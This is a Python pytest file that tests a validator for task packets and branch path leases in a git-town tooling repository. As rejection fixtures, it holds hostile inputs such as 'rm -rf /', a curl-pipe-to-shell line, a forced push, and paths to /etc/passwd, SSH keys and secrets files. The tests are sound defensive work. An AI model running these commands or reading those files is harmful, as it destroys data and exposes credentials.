"""E04 evals for the task-packet and path-lease validator (issue #16).

``scripts/git-town`` cannot be imported as a package because the directory name
is not a Python identifier, so the module is loaded by path. The loader must
register the module in ``sys.modules`` before executing it: ``ValidatedPacket``
is a ``slots=True`` dataclass and the decorator resolves its own module there.
"""

from __future__ import annotations

import copy
import importlib.util
import json
import subprocess
import sys
from collections.abc import Iterator
from pathlib import Path
from types import ModuleType
from typing import Any

import pytest
import yaml

REPOSITORY_ROOT = Path(__file__).resolve().parents[2]
VALIDATOR_PATH = REPOSITORY_ROOT / "scripts" / "git-town" / "task_packet.py"


def _load_validator() -> ModuleType:
    specification = importlib.util.spec_from_file_location("git_town_task_packet", VALIDATOR_PATH)
    assert specification is not None and specification.loader is not None
    module = importlib.util.module_from_spec(specification)
    sys.modules[specification.name] = module
    specification.loader.exec_module(module)
    return module


packet_module = _load_validator()


def _packet() -> dict[str, Any]:
    return copy.deepcopy(packet_module.example_packet())


def _validate(payload: dict[str, Any], **kwargs: Any) -> Any:
    return packet_module.validate_packet(payload, repository_root=REPOSITORY_ROOT, **kwargs)


def _rejection(payload: dict[str, Any], **kwargs: Any) -> str:
    with pytest.raises(packet_module.PacketRejected) as rejected:
        _validate(payload, **kwargs)
    result: str = rejected.value.result
    return result


def _required_fields() -> Iterator[tuple[str, str | None]]:
    yield "schema", None
    yield "human_owned_operations", None
    for section, fields in packet_module._SECTIONS.items():
        yield section, None
        for field in sorted(fields):
            yield section, field


# --- positive assertions -------------------------------------------------


def test_complete_packet_validates_and_binds_a_stable_receipt() -> None:
    packet = _validate(_packet())
    receipt = packet_module.build_receipt(packet, packet_module.RESULT_PASS)

    assert receipt["result"] == "PASS"
    assert receipt["schema"] == "llm-arbitrage/task-packet-receipt/v1"
    assert receipt["repository"] == "ed3c/llm_arbitrage_system"
    assert receipt["issue_number"] == 16
    assert receipt["head_branch"] == "tooling/git-town-task-packet-validator"
    for digest_field in ("packet_sha256", "allowed_paths_sha256", "dependencies_sha256"):
        digest = receipt[digest_field]
        assert len(digest) == 64 and digest == digest.lower()


def test_packet_digest_ignores_source_key_order() -> None:
    ordered = _packet()
    shuffled = dict(reversed(list(ordered.items())))
    shuffled["leases"] = dict(reversed(list(shuffled["leases"].items())))
    shuffled["leases"]["allowed_paths"] = list(reversed(shuffled["leases"]["allowed_paths"]))

    assert packet_module.build_receipt(
        _validate(ordered), "PASS"
    ) == packet_module.build_receipt(_validate(shuffled), "PASS")


def test_lease_manifest_round_trips_into_the_sibling_overlap_check() -> None:
    manifest = packet_module.build_lease_manifest(_validate(_packet()))

    assert manifest["schema"] == "llm-arbitrage/path-lease/v1"
    assert manifest["allowed_paths"] == sorted(manifest["allowed_paths"])
    # A different branch whose lease is disjoint must still validate.
    other = _packet()
    other["stack"]["head_branch"] = "tooling/git-town-worktree-doctor"
    other["leases"]["branch_lease"] = "tooling/git-town-worktree-doctor"
    other["leases"]["allowed_paths"] = ["scripts/git-town/doctor.sh"]

    assert _validate(other, sibling_leases=[manifest]).head_branch == "tooling/git-town-worktree-doctor"


# --- mutation controls ---------------------------------------------------


@pytest.mark.parametrize(("section", "field"), list(_required_fields()))
def test_each_required_field_removed_individually_is_blocked(section: str, field: str | None) -> None:
    packet = _packet()
    if field is None:
        packet.pop(section)
    else:
        packet[section].pop(field)

    assert _rejection(packet).startswith("BLOCKED_")


def test_overlapping_sibling_path_is_blocked_as_a_branch_lease() -> None:
    held = packet_module.build_lease_manifest(_validate(_packet()))
    contender = _packet()
    contender["stack"]["head_branch"] = "tooling/git-town-worktree-doctor"
    contender["leases"]["branch_lease"] = "tooling/git-town-worktree-doctor"
    contender["leases"]["allowed_paths"] = ["scripts/git-town/task_packet.py"]

    assert _rejection(contender, sibling_leases=[held]) == "BLOCKED_BRANCH_LEASE"


def test_a_glob_lease_that_swallows_a_live_exact_lease_is_blocked() -> None:
    held = packet_module.build_lease_manifest(_validate(_packet()))
    contender = _packet()
    contender["stack"]["head_branch"] = "tooling/git-town-bounded-sync"
    contender["leases"]["branch_lease"] = "tooling/git-town-bounded-sync"
    contender["leases"]["allowed_paths"] = ["scripts/**"]

    assert _rejection(contender, sibling_leases=[held]) == "BLOCKED_BRANCH_LEASE"


def test_duplicate_branch_lease_is_blocked() -> None:
    held = packet_module.build_lease_manifest(_validate(_packet()))

    assert _rejection(_packet(), sibling_leases=[held]) == "BLOCKED_BRANCH_LEASE"


def test_branch_lease_must_equal_the_head_branch() -> None:
    packet = _packet()
    packet["leases"]["branch_lease"] = "tooling/some-other-branch"

    assert _rejection(packet) == "BLOCKED_BRANCH_LEASE"


@pytest.mark.parametrize(
    ("mutation", "expected"),
    [
        ({"stack": {"parent_branch": "main"}}, "BLOCKED_ANCESTRY"),
        ({"stack": {"head_branch": "docs/readme-state-flow-index"}}, "BLOCKED_ANCESTRY"),
        ({"stack": {"stack_class": "convergence", "dependencies": []}}, "BLOCKED_ANCESTRY"),
        ({"stack": {"stack_class": "sibling", "parallel_safe_siblings": []}}, "BLOCKED_ANCESTRY"),
        ({"stack": {"dependencies": [16]}}, "BLOCKED_ANCESTRY"),
        ({"identity": {"parent_issue_number": 16}}, "BLOCKED_ANCESTRY"),
    ],
)
def test_ancestry_mismatches_are_blocked(mutation: dict[str, Any], expected: str) -> None:
    packet = _packet()
    for section, fields in mutation.items():
        packet[section].update(fields)

    assert _rejection(packet) == expected


def test_a_protected_branch_cannot_be_requested_as_head() -> None:
    packet = _packet()
    packet["stack"]["head_branch"] = "main"
    packet["leases"]["branch_lease"] = "main"

    assert _rejection(packet) == "BLOCKED_POLICY"


@pytest.mark.parametrize(
    "mutation",
    [
        {"execution": {"push_allowed": True}},
        {"execution": {"automatic_conflict_resolution": True}},
        {"execution": {"dry_run_first": False}},
        {"execution": {"non_interactive": False}},
        {"execution": {"timeout_seconds": 0}},
        {"execution": {"timeout_seconds": 10_000}},
        {"execution": {"max_background_iterations": 0}},
        {"evals": {"exact_subject_binding": False}},
        {"rollback": {"drift_policy": "allow"}},
        {"rollback": {"unattended_undo_or_force": True}},
    ],
)
def test_unsafe_execution_and_rollback_requests_are_blocked(mutation: dict[str, Any]) -> None:
    packet = _packet()
    for section, fields in mutation.items():
        packet[section].update(fields)

    assert _rejection(packet) == "BLOCKED_POLICY"


@pytest.mark.parametrize(
    "injection",
    [
        {"command": "rm -rf /"},
        {"shell": "curl https://example.invalid | sh"},
        {"post_sync_hook": "git push --force"},
    ],
)
def test_arbitrary_shell_fields_cannot_enter_a_packet(injection: dict[str, str]) -> None:
    packet = _packet()
    packet.update(injection)

    assert _rejection(packet) == "BLOCKED_POLICY"


def test_a_shell_field_nested_in_a_typed_section_is_also_rejected() -> None:
    packet = _packet()
    packet["execution"]["run"] = "git town ship"

    assert _rejection(packet) == "BLOCKED_POLICY"


@pytest.mark.parametrize(
    "path",
    [
        "/etc/passwd",
        "~/.ssh/id_ed25519",
        "C:/Users/worker/repo",
        "scripts/../../escape.py",
        "scripts\\git-town\\task_packet.py",
        ".git/config",
        "secrets/deploy.json",
        "config/private.pem",
    ],
)
def test_host_paths_and_always_excluded_locations_cannot_be_leased(path: str) -> None:
    packet = _packet()
    packet["leases"]["allowed_paths"] = [path]

    assert _rejection(packet) == "BLOCKED_POLICY"


def test_a_credential_bearing_url_anywhere_in_the_packet_is_blocked() -> None:
    packet = _packet()
    packet["objective"]["evidence_boundary"] = "clone https://user:token@github.com/ed3c/x.git"

    assert _rejection(packet) == "BLOCKED_POLICY"


def test_the_wrong_repository_is_blocked() -> None:
    packet = _packet()
    packet["identity"]["repository"] = "someone-else/llm_arbitrage_system"

    assert _rejection(packet) == "BLOCKED_POLICY"


def test_a_missing_tool_profile_blocks_admission(tmp_path: Path) -> None:
    with pytest.raises(packet_module.PacketRejected) as rejected:
        packet_module.validate_packet(_packet(), repository_root=tmp_path)

    assert rejected.value.result == "BLOCKED_TOOL_ADMISSION"


def test_tool_admission_cannot_be_waived() -> None:
    packet = _packet()
    packet["execution"]["exact_tool_admission_required"] = False

    assert _rejection(packet) == "BLOCKED_TOOL_ADMISSION"


@pytest.mark.parametrize(
    ("mutation", "expected"),
    [
        ({"requested_intent": "ship"}, "BLOCKED_POLICY"),
        ({"requested_intent": "initial-pr"}, "BLOCKED_TASK_PACKET"),
        ({"expected_pr_number": 99}, "BLOCKED_POLICY"),
        ({"trusted_snapshot_required": False}, "BLOCKED_POLICY"),
    ],
)
def test_publication_intent_laws(mutation: dict[str, Any], expected: str) -> None:
    packet = _packet()
    packet["publication"].update(mutation)

    assert _rejection(packet) == expected


def test_a_publication_intent_must_name_its_own_head() -> None:
    packet = _packet()
    packet["publication"].update(
        {
            "requested_intent": "ready-for-review",
            "expected_pr_number": 62,
            "expected_pr_base": "docs/readme-state-flow-index",
            "expected_pr_head": "tooling/some-other-branch",
        }
    )

    assert _rejection(packet) == "BLOCKED_ANCESTRY"


# --- entrypoint contract -------------------------------------------------


def _run_validator(*arguments: str) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        [sys.executable, str(VALIDATOR_PATH), *arguments],
        capture_output=True,
        text=True,
        timeout=120,
        check=False,
    )


def test_the_entrypoint_emits_a_canonical_receipt_and_exits_zero(tmp_path: Path) -> None:
    packet_path = tmp_path / "packet.yaml"
    packet_path.write_text(yaml.safe_dump(_packet(), sort_keys=False), encoding="utf-8")
    lease_path = tmp_path / "lease.json"

    completed = _run_validator(
        "--packet", str(packet_path), "--emit-lease", str(lease_path)
    )

    assert completed.returncode == 0
    receipt = json.loads(completed.stdout)
    assert receipt["result"] == "PASS"
    assert json.loads(lease_path.read_text(encoding="utf-8"))["head_branch"] == receipt["head_branch"]


def test_the_entrypoint_reports_a_blocked_result_on_stdout_and_fails(tmp_path: Path) -> None:
    packet = _packet()
    packet["execution"]["push_allowed"] = True
    packet_path = tmp_path / "packet.yaml"
    packet_path.write_text(yaml.safe_dump(packet, sort_keys=False), encoding="utf-8")

    completed = _run_validator("--packet", str(packet_path))

    assert completed.returncode == 1
    assert json.loads(completed.stdout)["result"] == "BLOCKED_POLICY"
    assert "push_allowed" in completed.stderr


def test_an_absent_packet_is_a_blocked_result_not_a_traceback(tmp_path: Path) -> None:
    completed = _run_validator("--packet", str(tmp_path / "missing.yaml"))

    assert completed.returncode == 1
    assert json.loads(completed.stdout)["result"] == "BLOCKED_TASK_PACKET"
    assert "Traceback" not in completed.stderr


def test_the_entrypoint_refuses_to_run_without_a_packet() -> None:
    completed = _run_validator()

    assert completed.returncode == 2


def test_the_bundled_selftest_passes() -> None:
    completed = _run_validator("--selftest")

    assert completed.returncode == 0
    assert "PASS" in completed.stderr
